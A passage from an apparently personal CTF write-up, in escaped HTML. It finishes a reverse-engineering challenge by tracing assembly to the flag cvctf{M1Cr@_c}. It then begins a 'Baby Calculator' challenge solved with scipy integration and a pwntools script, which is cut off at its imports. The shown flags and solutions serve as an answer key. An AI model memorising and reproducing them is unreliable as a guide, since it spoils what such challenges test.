&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)          &#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;114
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SUB  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;66 &lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)          &#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@if2:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;286&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;95&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;333
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;CMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1         
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JNE  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@true2:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SUB  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;286&lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;285
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;285&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;95
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)           &#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;95
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false2:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;286&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;143
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)          &#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;143
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit2:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SHL  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;88
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;ADD  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;88 &lt;&#x2F;span&gt;&lt;span&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)           &#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) =&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;LEA  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; %&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@main_exit
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@main_exit:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;SP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;POP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;RET 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cvctf{M1Cr@_c}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Later the values present in the memory locations from &lt;code&gt;-28(%BP)&lt;&#x2F;code&gt; to &lt;code&gt;-4(%BP)&lt;&#x2F;code&gt; converted these integers to ascii and The result was wrapped around cvctf{}.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{M1Cr@_c}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;misc&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc&quot; aria-label=&quot;Anchor link for: misc&quot;&gt;Misc&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;baby-calculator&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#baby-calculator&quot; aria-label=&quot;Anchor link for: baby-calculator&quot;&gt;Baby Calculator&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_babycalc.png&quot; alt=&quot;baby calc&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nc 20.169.252.240 4200&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A good challenge to do writeup.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;babycalc$&lt;&#x2F;span&gt;&lt;span&gt; nc 20.169.252.240 4200
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to the Baby Calculator! Answer 40 questions in a minute to get the flag.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;The&lt;&#x2F;span&gt;&lt;span&gt; difference between your input and the correct answer must be less than 1e-6.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[+]&lt;&#x2F;span&gt;&lt;span&gt; Question 1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Evaluate&lt;&#x2F;span&gt;&lt;span&gt; the integral of: 4&#x2F;x from 3 to 7.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; Answer: 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;It was asking us to do integral of &lt;code&gt;4&#x2F;x from 3 to 7&lt;&#x2F;code&gt;, It was easy to do with &lt;code&gt;scipy&lt;&#x2F;code&gt; module of python&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;scipy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;integrate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;quad
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;compute_integral&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;lower_limit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;upper_limit&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    integral, error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;quad&lt;&#x2F;span&gt;&lt;span&gt;(func&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;lower_limit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;upper_limit)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;integral
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;x 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;compute_integral&lt;&#x2F;span&gt;&lt;span&gt;(f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;But it was difficult to answer 40 questions in a minute. So, I used &lt;code&gt;pwntools&lt;&#x2F;code&gt; to automate this process.&lt;&#x2F;p&gt;
&lt;p&gt;This is my solution script.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;math &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;cos&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;exp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;pi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;sin
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;scipy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;integrate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;quad
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span&gt;
